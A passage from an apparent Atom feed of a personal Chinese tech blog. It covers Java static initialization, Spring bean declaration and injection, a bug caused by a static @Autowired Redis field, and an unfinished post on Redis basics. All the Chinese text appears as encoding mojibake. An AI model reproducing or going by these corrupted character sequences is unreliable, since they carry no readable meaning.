href="#é™æ€è¯­å¥å—" class="headerlink" title="é™æ€è¯­å¥å—"></a>é™æ€è¯­å¥å—</h4><p>é™æ€ä»£ç å—å®šä¹‰åœ¨ç±»ä¸­æ–¹æ³•å¤–ï¼Œé™æ€ä»£ç å—åœ¨éé™æ€ä»£ç å—ä¹‹å‰æ‰§è¡Œã€‚è¯¥ç±»ä¸ç®¡åˆ›å»ºå¤šå°‘å¯¹è±¡ï¼Œåœ¨ç±»åˆå§‹åŒ–æ—¶è¿è¡Œä¸€æ¬¡ã€‚</p><h4 id="é™æ€å†…éƒ¨ç±»"><a href="#é™æ€å†…éƒ¨ç±»" class="headerlink" title="é™æ€å†…éƒ¨ç±»"></a>é™æ€å†…éƒ¨ç±»</h4><p>éé™æ€å†…éƒ¨ç±»åœ¨ç¼–è¯‘å®Œæˆä¹‹åä¼šéšå«åœ°ä¿å­˜ç€ä¸€ä¸ªå¼•ç”¨ï¼Œè¯¥å¼•ç”¨æ˜¯æŒ‡å‘åˆ›å»ºå®ƒçš„å¤–å›´ç±»ï¼Œä½†æ˜¯é™æ€å†…éƒ¨ç±»å´æ²¡æœ‰ã€‚éé™æ€å†…éƒ¨ç±»ä¾èµ–äºå¤–éƒ¨ç±»çš„å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦å…ˆåˆ›å»ºå¤–éƒ¨ç±»å®ä¾‹ï¼Œæ‰èƒ½ç”¨è¿™ä¸ªå®ä¾‹å»åˆ›å»ºéé™æ€å†…éƒ¨ç±»ã€‚è€Œé™æ€å†…éƒ¨ç±»ä¸éœ€è¦ã€‚é™æ€å†…éƒ¨ç±»ä¸èƒ½è®¿é—®å¤–éƒ¨ç±»çš„éé™æ€çš„å˜é‡å’Œæ–¹æ³•ã€‚</p><h4 id="é™æ€å¯¼åŒ…"><a href="#é™æ€å¯¼åŒ…" class="headerlink" title="é™æ€å¯¼åŒ…"></a>é™æ€å¯¼åŒ…</h4><p>JDK1.5</p><p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯<u><strong>é™æ€æ–¹æ³•</strong></u>ï¼Œå±äºç±»ï¼Œè€Œä¸å±äºæŸä¸ªå®ä¾‹ï¼Œè°ƒç”¨é™æ€æ–¹æ³•æ—¶ä¸ä¼šåˆ›å»ºå¯¹è±¡ã€‚</p><p>é™æ€æ–¹æ³•è¿˜æåˆ°äº†åˆå§‹åŒ–é¡ºåºï¼š</p><h4 id="åˆå§‹åŒ–é¡ºåº"><a href="#åˆå§‹åŒ–é¡ºåº" class="headerlink" title="åˆå§‹åŒ–é¡ºåº"></a>åˆå§‹åŒ–é¡ºåº</h4><p>é™æ€å˜é‡å’Œé™æ€è¯­å¥å— -&gt; å®ä¾‹å˜é‡å’Œæ™®é€šè¯­å¥å— -&gt; æ„é€ å‡½æ•°ã€‚é™æ€å˜é‡å’Œé™æ€è¯­å¥å—çš„åˆå§‹åŒ–é¡ºåºå–å†³äºå®ƒä»¬åœ¨ä»£ç ä¸­çš„é¡ºåºã€‚</p><p><strong>å­˜åœ¨ç»§æ‰¿æ—¶çš„åˆå§‹åŒ–é¡ºåº</strong></p><ol><li><p>çˆ¶ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰</p></li><li><p>å­ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰</p></li><li><p>çˆ¶ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰</p></li><li><p>çˆ¶ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰</p></li><li><p>å­ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰</p></li><li><p>å­ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰</p></li></ol><h3 id="bean-çš„å£°æ˜"><a href="#bean-çš„å£°æ˜" class="headerlink" title="bean çš„å£°æ˜"></a>bean çš„å£°æ˜</h3><p>å…±æœ‰å››ç§æ–¹å¼å°†å°†ä¸€ä¸ª<u><strong>ç±»</strong></u>å£°æ˜ä¸º bean çš„æ³¨è§£ï¼š</p><h4 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h4><p>é€šç”¨çš„æ³¨è§£ï¼Œå¯æ ‡æ³¨ä»»æ„ç±»ä¸º Spring ç»„ä»¶ã€‚å¦‚æœä¸€ä¸ª bean ä¸çŸ¥é“å±äºå“ªä¸ªå±‚ï¼Œå¯ä»¥ä½¿ç”¨ @Component æ³¨è§£æ ‡æ³¨ã€‚åˆ›å»ºå¯¹è±¡ï¼ŒæŠŠå½“å‰å¯¹è±¡å­˜å…¥ Spring å®¹å™¨ä¸­ï¼Œç›¸å½“äº XML çš„ &lt; bean&gt;ã€‚</p><h4 id="Repository"><a href="#Repository" class="headerlink" title="@Repository"></a>@Repository</h4><p>å¯¹åº”æŒä¹…å±‚ï¼Œä¸»è¦ç”¨äºæ•°æ®åº“ç›¸å…³æ“ä½œã€‚</p><h4 id="Service"><a href="#Service" class="headerlink" title="@Service"></a>@Service</h4><p>å¯¹åº”æœåŠ¡å±‚ï¼Œä¸»è¦æ¶‰åŠä¸€äº›å¤æ‚çš„é€»è¾‘ã€‚</p><h4 id="Controller"><a href="#Controller" class="headerlink" title="@Controller"></a>@Controller</h4><p>å¯¹åº”æ§åˆ¶å±‚ï¼Œä¸»è¦ç”¨æˆ·æ¥å—ç”¨æˆ·è¯·æ±‚å¹¶è¿”å›æ•°æ®ç»™å‰ç«¯é¡µé¢ã€‚</p><p>@Bean æ³¨è§£ä½œç”¨äº<u><strong>æ–¹æ³•</strong></u>ï¼Œå¯¹æ¯”ä¸€ä¸‹ @Component ï¼š</p><h4 id="Component-å’Œ-Bean-çš„åŒºåˆ«"><a href="#Component-å’Œ-Bean-çš„åŒºåˆ«" class="headerlink" title="@Component å’Œ @Bean çš„åŒºåˆ«"></a>@Component å’Œ @Bean çš„åŒºåˆ«</h4><p>@Component æ³¨è§£ä½œç”¨äºç±»ï¼Œè€Œ @Bean æ³¨è§£ä½œç”¨äºæ–¹æ³•ã€‚</p><p>@Component é€šå¸¸æ˜¯é€šè¿‡ç±»è·¯å¾„æ‰«ææ¥è‡ªåŠ¨ä¾¦æµ‹ä»¥åŠè‡ªåŠ¨è£…é…åˆ° Spring å®¹å™¨ä¸­ï¼Œ@Bean æ³¨è§£é€šå¸¸æ˜¯åœ¨æ ‡æœ‰è¯¥æ³¨è§£çš„æ–¹æ³•ä¸­å®šä¹‰äº§ç”Ÿè¿™ä¸ª beanã€‚</p><p>@Bean æ³¨è§£æ¯” Component æ³¨è§£çš„è‡ªå®šä¹‰æ€§æ›´å¼ºï¼Œè€Œä¸”å¾ˆå¤šåœ°æ–¹æˆ‘ä»¬åªèƒ½é€šè¿‡ @Bean æ³¨è§£æ¥æ³¨å†Œ beanã€‚æ¯”å¦‚å½“æˆ‘ä»¬å¼•ç”¨ç¬¬ä¸‰æ–¹åº“ä¸­çš„ç±»éœ€è¦è£…é…åˆ° Spring å®¹å™¨æ—¶ï¼Œåˆ™åªèƒ½é€šè¿‡ @Bean æ¥å®ç°ã€‚</p><h3 id="bean-çš„æ³¨å…¥"><a href="#bean-çš„æ³¨å…¥" class="headerlink" title="bean çš„æ³¨å…¥"></a>bean çš„æ³¨å…¥</h3><p>@Autowired å¯ä»¥å®ç°è‡ªåŠ¨è£…é…ï¼Œå¯¹è±¡æ— éœ€è‡ªå·±æŸ¥æ‰¾æˆ–åˆ›å»ºä¸å…¶å…³è”çš„å…¶ä»–å¯¹è±¡ï¼Œç”±å®¹å™¨è´Ÿè´£æŠŠéœ€è¦ç›¸äº’åä½œçš„å¯¹è±¡å¼•ç”¨èµ‹äºˆå„ä¸ªå¯¹è±¡ã€‚</p><h4 id="å®¹å™¨ä¸­æŸ¥è¯¢å¯¹åº”ç±»å‹çš„-bean"><a href="#å®¹å™¨ä¸­æŸ¥è¯¢å¯¹åº”ç±»å‹çš„-bean" class="headerlink" title="å®¹å™¨ä¸­æŸ¥è¯¢å¯¹åº”ç±»å‹çš„ bean"></a>å®¹å™¨ä¸­æŸ¥è¯¢å¯¹åº”ç±»å‹çš„ bean</h4><ol><li><p>å¦‚æœæŸ¥è¯¢ç»“æœåˆšå¥½ä¸ºä¸€ä¸ªï¼Œå°±å°†è¯¥ bean è£…é…ç»™ @Autowired æŒ‡å®šçš„æ•°æ®ã€‚</p></li><li><p>å¦‚æœæŸ¥è¯¢çš„ç»“æœä¸æ­¢ä¸€ä¸ªï¼Œé‚£ä¹ˆ @Autowired ä¼šæ ¹æ®åç§°æ¥æŸ¥æ‰¾ã€‚</p></li><li><p>å¦‚æœä¸Šè¿°æŸ¥æ‰¾çš„ç»“æœä¸ºç©ºï¼Œé‚£ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸ã€‚è§£å†³æ–¹æ³•ï¼šä½¿ç”¨ required=falseã€‚</p></li></ol><p>@Resourceã€@Injectã€@Qualifier å’Œ @Value ä¹Ÿå¯ä»¥å®ç°åŒæ ·çš„è£…é…æ•ˆæœã€‚</p><h4 id="Autowired-å’Œ-Resource-ä¹‹é—´çš„åŒºåˆ«"><a href="#Autowired-å’Œ-Resource-ä¹‹é—´çš„åŒºåˆ«" class="headerlink" title="@Autowired å’Œ @Resource ä¹‹é—´çš„åŒºåˆ«"></a>@Autowired å’Œ @Resource ä¹‹é—´çš„åŒºåˆ«</h4><ul><li><p>@Autowired é»˜è®¤æ˜¯æŒ‰ç…§ç±»å‹è£…é…æ³¨å…¥çš„ã€‚</p></li><li><p>@Resource é»˜è®¤æ˜¯æŒ‰ç…§åç§°æ¥è£…é…æ³¨å…¥çš„ï¼Œåªæœ‰å½“æ‰¾ä¸åˆ°ä¸åç§°åŒ¹é…çš„ bean æ‰ä¼šæŒ‰ç…§ç±»å‹æ¥è£…é…æ³¨å…¥ã€‚</p></li></ul><h4 id="Qualifier"><a href="#Qualifier" class="headerlink" title="@Qualifier"></a>@Qualifier</h4><p>åœ¨æŒ‰ç…§ç±»æ³¨å…¥çš„åŸºç¡€ä¸Šå†æ ¹æ®åç§°æ³¨å…¥ã€‚ç»™ç±»æ³¨å…¥æ—¶ä¸èƒ½å•ç‹¬ä½¿ç”¨ï¼Œéœ€è¦é…åˆ @Autowiredã€‚ç»™æ–¹æ³•å’Œå˜é‡æ³¨å…¥æ—¶å¯ä»¥å•ç‹¬ä½¿ç”¨ã€‚</p><h4 id="Value"><a href="#Value" class="headerlink" title="@Value"></a>@Value</h4><p>åŸºæœ¬ç±»å‹å’Œ String æ— æ³•ç”¨ @Autowiredã€@Resource å’Œ @Qualifier å®ç°ï¼Œéœ€è¦ä½¿ç”¨ @Valueã€‚å¯ä»¥é…åˆ Spring çš„ EL è¡¨è¾¾å¼ SpELã€‚</p><h3 id="é—®é¢˜çš„åˆ†æå’Œè§£å†³æ–¹æ¡ˆ"><a href="#é—®é¢˜çš„åˆ†æå’Œè§£å†³æ–¹æ¡ˆ" class="headerlink" title="é—®é¢˜çš„åˆ†æå’Œè§£å†³æ–¹æ¡ˆ"></a>é—®é¢˜çš„åˆ†æå’Œè§£å†³æ–¹æ¡ˆ</h3><p>äº†è§£äº† staticã€bean çš„å£°æ˜å’Œæ³¨å…¥åï¼Œæ¥çœ‹ä¸€ä¸‹å‡ºé—®é¢˜çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RedisCache redisCache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendSms</span><span class="params">(String[] phoneNumbers)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    redisCache.setCacheObject(key,code);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸæ¥ä¸ºäº† TxsmsUtils.sendSms() æ–¹ä¾¿è€Œå°†è¿™ä¸ªæ–¹æ³•è®¾ç½®ä¸º staticï¼Œåœ¨æ–¹æ³•å†…ä½¿ç”¨ redisCache æ—¶éœ€è¦ redisCache ä¹Ÿæ˜¯é™æ€çš„ã€‚</p><p>ç„¶è€Œåƒä¸Šé¢åˆ†æçš„ï¼Œé™æ€å˜é‡å±äºç±»ï¼Œè€Œä¸å±äºæŸä¸ªå®ä¾‹ï¼Œä¸ä¼šç”± Spring æ³¨å…¥å¹¶åˆ›å»ºå¯¹è±¡ã€‚å› æ­¤ sendSms() è¿™ä¸ªæ–¹æ³•ä¸­æ˜¯è·å–ä¸åˆ° redisCache å¯¹è±¡çš„ï¼Œå› æ­¤å‡ºé”™ã€‚</p><p>è§£å†³ï¼šå°† sendSms() å’Œ redisCache è®¾ç½®ä¸ºéé™æ€ï¼Œå³å»é™¤ staticã€‚</p><p>å¦å¤–ï¼Œå¯¹äºå·¥å…·ç±»ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨å…¶ä»–ç»„ä»¶ï¼Œéœ€è¦å°†å·¥å…·ç±»ä¹Ÿå£°æ˜ä¸º Spring beanï¼Œäº¤ç»™ Spring æ¥æ§åˆ¶ï¼Œè¿™æ ·æ‰èƒ½è·å–åˆ°ç»„ä»¶çš„å®ä¾‹ã€‚</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>é™æ€æ–¹æ³•ä¸­æ— æ³•è¿›è¡Œè·å–åˆ° Spring bean çš„å®ä¾‹ï¼Œçœ‹ä¼¼ç›´æ¥æ˜äº†çš„ç»“è®ºï¼Œè‹¥ä¸æ˜¯åƒæˆ‘ä¸€æ ·åœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°è¿‡ bugï¼Œå¹¶ä»å¤´åˆ°å°¾æ’æŸ¥ä¸€è¾¹ï¼ŒçœŸçš„å¾—å¾ˆéš¾æœ‰å®Œæ•´çš„ç†è§£ã€‚</p><p>è¯»ä¸‡å·ä¹¦ï¼Œè¡Œä¸‡é‡Œè·¯ã€‚è¦åœ¨æ‡‚å¾—ç†è®ºçŸ¥è¯†çš„å‰æä¸‹ï¼Œç§¯æå®è·µï¼Œæ€»ç»“é”™è¯¯ã€‚æˆ‘çš„è¿™æ¡è·¯æ‰åˆšåˆšå¼€å§‹ã€‚</p>]]></content>
        <author>
            <name><![CDATA[é£çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/06/01/blog9/</id>
        <title><![CDATA[MySQL & Redis æŠ€æœ¯åˆ†äº«-ä¸‹]]></title>
        <updated>2020-08-25T07:09:01+08:00</updated>
        <link href="http://www.windboy.top/2020/06/01/blog9/"/>
        <content type="text/html" src="http://www.windboy.top/2020/06/01/blog9/"><![CDATA[<p>ä¸Šä¸€ç¯‡åšå®¢ä¸»è¦è°ˆåˆ° MySQL çš„åŸºç¡€çŸ¥è¯†å’Œé«˜çº§ç‰¹æ€§ï¼Œç°åœ¨è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ Redis éƒ¨åˆ†ã€‚</p><h2 id="Redis-åŸºç¡€"><a href="#Redis-åŸºç¡€" class="headerlink" title="Redis åŸºç¡€"></a>Redis åŸºç¡€</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Redis æ˜¯é€Ÿåº¦éå¸¸å¿«çš„éå…³ç³»å‹å†…å­˜é”®å€¼æ•°æ®åº“ã€‚<br>Redis å’Œ MySQL ä¸åŒä¹‹å¤„åœ¨äºï¼ŒRedis ç”¨çš„æ˜¯ NoSQLã€‚<br>ä¸»è¦ç”¨ä½œç¼“å­˜ï¼Œç¼“å­˜ç›®çš„ï¼š</p><ul><li>é«˜æ€§èƒ½ï¼šæ“ä½œç¼“å­˜å°±æ˜¯ç›´æ¥æ“ä½œå†…å­˜ï¼Œæ‰€ä»¥é€Ÿåº¦ç›¸å½“å¿«ã€‚</li><li>é«˜å¹¶å‘ï¼šç›´æ¥æ“ä½œç¼“å­˜èƒ½å¤Ÿæ‰¿å—çš„è¯·æ±‚æ˜¯è¿œè¿œå¤§äºç›´æ¥è®¿é—®æ•°æ®åº“çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æŠŠæ•°æ®åº“ä¸­çš„éƒ¨åˆ†æ•°æ®è½¬ç§»åˆ°ç¼“å­˜ä¸­å»ï¼Œè¿™æ ·ç”¨æˆ·çš„ä¸€éƒ¨åˆ†è¯·æ±‚ä¼šç›´æ¥åˆ°ç¼“å­˜è¿™é‡Œè€Œä¸ç”¨ç»è¿‡æ•°æ®åº“ã€‚å¹¶ä¸”ç¼“å­˜æ˜¯èµ°å†…å­˜çš„ï¼Œå†…å­˜å¤©ç„¶å°±æ”¯æ’‘é«˜å¹¶å‘ã€‚</li></ul><h3 id="ä¸ºä»€ä¹ˆé€Ÿåº¦å¿«ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆé€Ÿåº¦å¿«ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆé€Ÿåº¦å¿«ï¼Ÿ"></a>ä¸ºä»€ä¹ˆé€Ÿåº¦å¿«ï¼Ÿ</h3><ul><li>æ ¸å¿ƒæ˜¯åŸºäºéé˜»å¡çš„ I/O å¤šè·¯å¤ç”¨æœºåˆ¶ï¼Œç”¨å¾ˆå°‘çš„çº¿ç¨‹ä¹Ÿèƒ½å¿«é€Ÿå¤„ç†å¤§é‡ä»»åŠ¡ã€‚</li><li>å®Œå…¨åŸºäºå†…å­˜ï¼Œç»å¤§éƒ¨åˆ†è¯·æ±‚æ˜¯çº¯ç²¹çš„å†…å­˜æ“ä½œï¼Œéå¸¸å¿«é€Ÿã€‚æ•°æ®å­˜åœ¨å†…å­˜ä¸­ï¼Œç±»ä¼¼äº HashMapï¼ŒæŸ¥æ‰¾å’Œå¢åˆ çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(1)ã€‚</li><li>é‡‡ç”¨å•çº¿ç¨‹ï¼Œæ•°æ®å…¨éƒ½åœ¨å†…å­˜é‡Œï¼Œå•çº¿ç¨‹å»æ“ä½œå°±æ˜¯æ•ˆç‡æœ€é«˜çš„ã€‚åŒæ—¶é¿å…äº†ä¸å¿…è¦çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œç«äº‰é—®é¢˜è€Œæ¶ˆè€— CPUï¼Œä¸ç”¨å»è€ƒè™‘å¤šçº¿ç¨‹åŒæ­¥å’Œå„ç§é”çš„é—®é¢˜ï¼Œå¦‚åŠ é”é‡Šæ”¾é”å’Œæ­»é”å¯¼è‡´çš„æ€§èƒ½æ¶ˆè€—ã€‚å¦å¤–ï¼Œå•çº¿ç¨‹å¤©ç„¶æ”¯æŒåŸå­æ“ä½œã€‚</li></ul><p>å…¶ä»–åŸå› ï¼š</p><ul><li>æ•°æ®ç»“æ„ç®€å•ï¼Œå¯¹æ•°æ®æ“ä½œä¹Ÿç®€å•ã€‚</li><li>åº•å±‚æ¨¡å‹ï¼ŒRedis æ„å»ºäº†è‡ªå·±çš„ VM æœºåˆ¶ã€‚</li><li>C è¯­è¨€å®ç°ã€‚</li><li>å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡ä½¿ç”¨ Redis åºåˆ—åŒ–åè®® RESP è¿›è¡Œé€šä¿¡ã€‚</li></ul><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><ul><li>STRINGï¼Œå¯ä»¥å®ç°å¸¸è§„ key-value ç¼“å­˜åº”ç”¨å’Œè®¡æ•°ã€‚</li><li>LISTï¼Œå¯ä»¥å®ç°åˆ†é¡µæŸ¥è¯¢å’Œæ¶ˆæ¯é˜Ÿåˆ—ã€‚</li><li>SETï¼Œå¯ä»¥å®ç°å…±åŒå¥½å‹å’Œå»é‡ã€‚</li><li>HASHï¼Œå¯ä»¥å®ç°å­˜å‚¨å¯¹è±¡ã€‚</li><li>ZSETï¼Œå¯ä»¥å®ç°æ’è¡Œæ¦œã€‚ZSETå¢åŠ äº†ä¸€ä¸ªæƒé‡å‚æ•° scoreï¼Œä½¿å¾—é›†åˆä¸­çš„å…ƒç´ èƒ½å¤ŸæŒ‰ score è¿›è¡Œæœ‰åºæ’åˆ—ã€‚</li></ul><h4 id="Jedis-å®ç°æ•°æ®ç±»å‹çš„åŸºæœ¬æ“ä½œ"><a href="#Jedis-å®ç°æ•°æ®ç±»å‹çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="Jedis å®ç°æ•°æ®ç±»å‹çš„åŸºæœ¬æ“ä½œ"></a>Jedis å®ç°æ•°æ®ç±»å‹çš„åŸºæœ¬æ“ä½œ</h4><p>åŒæ ·æ¼”ç¤ºä»£ç åœ¨ <a href="https://github.com/Jiebupup/demo" target="_blank" rel="noopener">https://github.com/Jiebupup/demo</a> ä¸­æœ‰ï¼Œä»‹ç»äº† Jedis å¯¹åº”ä¸Šè¿°äº”ä¸ªæ•°æ®ç±»å‹çš„æ“ä½œã€‚ </p><h3 id="æŒä¹…åŒ–"><a href="#æŒä¹…åŒ–" class="headerlink" title="æŒä¹…åŒ–"></a>æŒä¹…åŒ–</h3><p>Redis æ˜¯å†…å­˜å‹æ•°æ®åº“ï¼Œä¸ºäº†ä¿è¯æ•°æ®åœ¨æ–­ç”µåä¸ä¼šä¸¢å¤±ï¼Œéœ€è¦å°†å†…å­˜ä¸­çš„æ•°æ®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸Šã€‚</p><h4 id="RDB-å¿«ç…§"><a href="#RDB-å¿«ç…§" class="headerlink" title="RDB å¿«ç…§"></a>RDB å¿«ç…§</h4><p>åˆ›å»ºå¿«ç…§æ¥è·å¾—å­˜å‚¨åœ¨å†…å­˜é‡Œé¢çš„æ•°æ®åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„å‰¯æœ¬ï¼Œå†å­˜æ”¾åˆ°ç¡¬ç›˜ä¸Šã€‚</p><p>å®é™…æ“ä½œè¿‡ç¨‹æ˜¯ fork ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå…ˆå°†æ•°æ®é›†å†™å…¥ä¸´æ—¶æ–‡ä»¶ï¼Œå†™å…¥æˆåŠŸåï¼Œå†æ›¿æ¢ä¹‹å‰çš„æ–‡ä»¶ï¼Œç”¨äºŒè¿›åˆ¶å‹ç¼©å­˜å‚¨ã€‚</p><p>å¯ä»¥å°†å¿«ç…§å¤åˆ¶åˆ°å…¶å®ƒæœåŠ¡å™¨ä»è€Œåˆ›å»ºå…·æœ‰ç›¸åŒæ•°æ®çš„æœåŠ¡å™¨å‰¯æœ¬ï¼ˆå°±æ˜¯ Redis çš„ä¸»ä»ç»“æ„ï¼‰ï¼Œè¿˜å¯ä»¥å°†å¿«ç…§ç•™åœ¨åŸæœåŠ¡å™¨ä»¥ä¾¿é‡å¯æœåŠ¡å™¨çš„æ—¶å€™ä½¿ç”¨ã€‚<br>å¦‚æœç³»ç»Ÿå‘ç”Ÿæ•…éšœï¼Œå°†ä¼šä¸¢å¤±æœ€åä¸€æ¬¡åˆ›å»ºå¿«ç…§ä¹‹åçš„æ•°æ®ã€‚<br>å¦‚æœæ•°æ®é‡å¾ˆå¤§ï¼Œä¿å­˜å¿«ç…§çš„æ—¶é—´ä¼šå¾ˆé•¿ã€‚</p><h4 id="AOF-æ–‡ä»¶"><a href="#AOF-æ–‡ä»¶" class="headerlink" title="AOF æ–‡ä»¶"></a>AOF æ–‡ä»¶</h4><p>å°†å†™å‘½ä»¤æ·»åŠ åˆ° AOF æ–‡ä»¶ï¼ˆAppend Only Fileï¼‰çš„æœ«å°¾ã€‚</p><p>è®¾ç½®åŒæ­¥é€‰é¡¹ï¼šä½¿ç”¨ AOF æŒä¹…åŒ–éœ€è¦è®¾ç½®åŒæ­¥é€‰é¡¹ï¼Œä»è€Œç¡®ä¿å†™å‘½ä»¤åŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ä¸Šçš„æ—¶æœºã€‚è¿™æ˜¯å› ä¸ºå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥å¹¶ä¸ä¼šé©¬ä¸Šå°†å†…å®¹åŒæ­¥åˆ°ç£ç›˜ä¸Šï¼Œè€Œæ˜¯å…ˆå­˜å‚¨åˆ°ç¼“å†²åŒºï¼Œç„¶åç”±æ“ä½œç³»ç»Ÿå†³å®šä»€ä¹ˆæ—¶å€™åŒæ­¥åˆ°ç£ç›˜ã€‚</p><ul><li>alwaysï¼šä¼šä¸¥é‡å‡ä½æœåŠ¡å™¨çš„æ€§èƒ½ã€‚</li><li>everysecï¼šæ¯”è¾ƒåˆé€‚ï¼Œå¯ä»¥ä¿è¯ç³»ç»Ÿå´©æºƒæ—¶åªä¼šä¸¢å¤±ä¸€ç§’å·¦å³çš„æ•°æ®ï¼Œå¹¶ä¸” Redis æ¯ç§’æ‰§è¡Œä¸€æ¬¡åŒæ­¥å¯¹æœåŠ¡å™¨æ€§èƒ½å‡ ä¹æ²¡æœ‰ä»»ä½•å½±å“ã€‚</li><li>noï¼šå¹¶ä¸èƒ½ç»™æœåŠ¡å™¨æ€§èƒ½å¸¦æ¥å¤šå¤§çš„æå‡ï¼Œè€Œä¸”ä¹Ÿä¼šå¢åŠ ç³»ç»Ÿå´©æºƒæ—¶æ•°æ®ä¸¢å¤±çš„æ•°é‡ã€‚</li></ul><p>AOF é‡å†™ï¼šéšç€æœåŠ¡å™¨å†™è¯·æ±‚çš„å¢å¤šï¼ŒAOF æ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§ã€‚Redis æä¾›äº†ä¸€ç§å°† AOF é‡å†™çš„ç‰¹æ€§ï¼Œèƒ½å¤Ÿå»é™¤ AOF æ–‡ä»¶ä¸­çš„å†—ä½™å†™å‘½ä»¤ã€‚</p><h2 id="Redis-é«˜çº§ç‰¹æ€§"><a href="#Redis-é«˜çº§ç‰¹æ€§" class="headerlink" title="Redis é«˜çº§ç‰¹æ€§"></a>Redis é«˜çº§ç‰¹æ€§</h2><h3 id="å¤åˆ¶"><a href="#å¤åˆ¶" class="headerlink" title="å¤åˆ¶"></a>å¤åˆ¶</h3><p>Redis çš„å¤åˆ¶ä¸ MySQL ä¸»ä»å¤åˆ¶ç±»ä¼¼ã€‚<br>Redis å¤åˆ¶æ°´å¹³æ‰©å®¹æ”¯æ’‘è¯»é«˜å¹¶å‘ï¼Œå¹¶ä¸”ä» Redis 2.8 å¼€å§‹æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œå³ä¸»ä»å¤åˆ¶è¿‡ç¨‹ä¸­ï¼Œç½‘ç»œè¿æ¥æ–­æ‰äº†ï¼Œé‚£ä¹ˆå¯ä»¥æ¥ç€ä¸Šæ¬¡å¤åˆ¶çš„åœ°æ–¹ï¼Œç»§ç»­å¤åˆ¶ä¸‹å»ã€‚</p><h3 id="å“¨å…µ"><a href="#å“¨å…µ" class="headerlink" title="å“¨å…µ"></a>å“¨å…µ</h3><p>å¯ä»¥ç›‘å¬é›†ç¾¤ä¸­çš„æœåŠ¡å™¨ï¼Œå¹¶åœ¨ä¸»æœåŠ¡å™¨è¿›å…¥ä¸‹çº¿çŠ¶æ€æ—¶ï¼Œè‡ªåŠ¨ä»ä»æœåŠ¡å™¨ä¸­é€‰ä¸¾å‡ºæ–°çš„ä¸»æœåŠ¡å™¨ã€‚<br>ç”¨äºå®ç° Redis é›†ç¾¤çš„é«˜å¯ç”¨ï¼Œæœ¬èº«ä¹Ÿæ˜¯ä½œä¸ºä¸€ä¸ªå“¨å…µé›†ç¾¤å»è¿è¡Œï¼Œäº’ç›¸ååŒå·¥ä½œã€‚</p><h3 id="é›†ç¾¤"><a href="#é›†ç¾¤" class="headerlink" title="é›†ç¾¤"></a>é›†ç¾¤</h3><p>é›†ç¾¤ä¸­æœ‰å¤šä¸ª master èŠ‚ç‚¹ï¼Œæ¯ä¸ª master åˆæœ‰å¤šä¸ª slave èŠ‚ç‚¹ã€‚å’Œå“¨å…µå…±åŒå®ç°äº†é›†ç¾¤çš„é«˜å¯ç”¨ã€‚</p><p>Gossip åè®®ä¸é›†ä¸­å¼åè®®ä¸åŒï¼šæ‰€æœ‰èŠ‚ç‚¹éƒ½æŒæœ‰ä¸€ä»½å…ƒæ•°æ®ï¼Œä¸åŒçš„èŠ‚ç‚¹å¦‚æœå‡ºç°äº†å…ƒæ•°æ®çš„å˜æ›´ï¼Œå°±ä¸æ–­å°†å…ƒæ•°æ®å‘é€ç»™å…¶å®ƒçš„èŠ‚ç‚¹ï¼Œè®©å…¶å®ƒèŠ‚ç‚¹ä¹Ÿè¿›è¡Œå…ƒæ•°æ®çš„å˜æ›´ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€»ç»“ä¸€ä¸‹è¿™ä¸€æ¬¡çš„æŠ€æœ¯åˆ†äº«ã€‚é¦–å…ˆï¼Œåˆ†äº«çš„å†…å®¹æ¯”è¾ƒä¾¿åŸºç¡€ï¼Œåœ¨æ•´ç†å‡ºå¤§é‡çš„çŸ¥è¯†ç‚¹çš„åŒæ—¶ï¼Œæˆ‘ä¹Ÿå‡†å¤‡äº†å‡ 